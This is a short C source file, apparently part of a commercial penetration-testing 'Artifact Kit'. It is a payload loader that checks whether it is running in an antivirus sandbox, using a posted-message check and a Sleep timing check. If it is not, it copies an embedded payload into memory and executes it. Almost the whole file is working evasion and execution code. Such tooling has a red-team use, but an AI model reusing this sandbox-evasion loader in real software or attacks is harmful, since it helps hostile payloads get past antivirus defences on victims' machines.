/*
 * Artifact Kit - A means to disguise and inject our payloads... *pHEAR*
 * (c) 2014 Strategic Cyber LLC
 *
 * See http://www.advancedpentest.com/license
 *
 * This technique is from Facts and myths about antivirus evasion with Metasploit
 * by mihi (@mihi42)
 *
 * http://schierlm.users.sourceforge.net/avevasion.html
 *
 * See the Antivirus Sandbox Evasion section.
 */

#include <windows.h>
#include <stdio.h>
#include "patch.h"

void start(HINSTANCE mhandle) {
	phear * payload = (phear *)data;
	char * buffer;

	/* post and retrieve a message... to see if we're in an A/V sandbox or not. */
	MSG msg;
	DWORD tc;
	PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
	if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
		return;

	if (msg.message != WM_USER+2 || msg.wParam != 23 || msg.lParam != 42)
		return;

	/* check timing of A/V sandbox... */
	tc = GetTickCount();
	Sleep(650);

	if (((GetTickCount() - tc) / 300) != 2)
		return;

	/* copy our payload into its own buffer... necessary b/c spawn modifies it */
	buffer = (char *)malloc(payload->length);
	memcpy(buffer, payload->payload, payload->length);

	/* execute our payload */
	spawn(buffer, payload->length, payload->key);

	/* clean up after ourselves */
	free(buffer);
}
